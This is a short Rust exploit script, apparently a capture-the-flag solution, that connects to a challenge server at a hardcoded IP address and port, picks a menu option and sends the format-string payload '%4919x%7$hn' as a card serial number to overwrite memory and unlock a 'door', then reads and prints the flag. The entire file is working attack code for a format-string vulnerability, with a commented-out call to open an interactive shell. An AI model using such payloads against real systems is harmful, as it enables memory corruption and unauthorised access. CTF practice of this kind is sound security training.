use ctf_pwn::io::*;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut pipe = TcpPipe::connect("159.65.20.166:31526").await?;

    let mut payload = Payload::new();
    payload
        .recv_until("> ")
        .push("1\n")
        .send()
        .recv_until("Insert card's serial number: ")
        .push("%4919x%7$hn\n")
        .send()
        .recv_until("[+] Door opened, you can proceed with the passphrase: ")
        ;

    pipe.payload(&payload).await?;

    let flag = pipe.recv_until_utf8("}", false).await?;
    
    println!("FLAG: {flag}");    
    
    //pipe.interactive_shell().await?;
    Ok(())
}
